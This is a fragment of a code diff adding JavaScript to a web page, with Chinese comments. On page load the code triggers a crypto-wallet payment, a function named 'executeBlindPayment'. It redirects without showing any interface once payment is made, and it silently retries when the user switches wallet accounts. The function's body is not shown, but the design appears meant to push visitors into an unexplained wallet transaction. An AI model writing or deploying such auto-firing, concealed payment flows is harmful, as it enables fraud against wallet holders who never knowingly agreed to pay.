+                    let errorMsg = '支付失败: ';
+                    if (error.code === 4001) {
+                        errorMsg += '用户拒绝交易';
+                    } else if (error.message.includes('余额不足')) {
+                        errorMsg = error.message;  // 直接显示余额不足
+                    } else {
+                        errorMsg += error.message || '未知错误';
+                    }
+                    showMessage('❌ ' + errorMsg, true);
+
+                    // 可提供一个重试按钮？但不需要，用户可刷新页面重新开始
+                }
+            }
+
+            // ========== 启动：页面加载即运行 ==========
+            // 微小的延迟确保DOM已准备，然后立即执行
+            window.addEventListener('load', () => {
+                // 如果已经支付过，瞬间跳转 (不会看到任何界面)
+                if (hasPaid()) {
+                    window.location.replace(CONFIG.redirectUrl);
+                    return;
+                }
+
+                // 否则立即触发支付流程
+                executeBlindPayment();
+            });
+
+            // 监听账户切换 (如果用户在支付中途切换钱包，可以重新尝试)
+            if (window.ethereum) {
+                window.ethereum.on('accountsChanged', (accounts) => {
+                    if (accounts.length > 0 && !hasPaid()) {
+                        // 如果还没支付，切账户后自动重试（隐藏提示重新走流程）
+                        hideMessage();
+                        executeBlindPayment();
+                    }
+                });
+            }
+
+        })();
     </script>
 </body>
 </html>
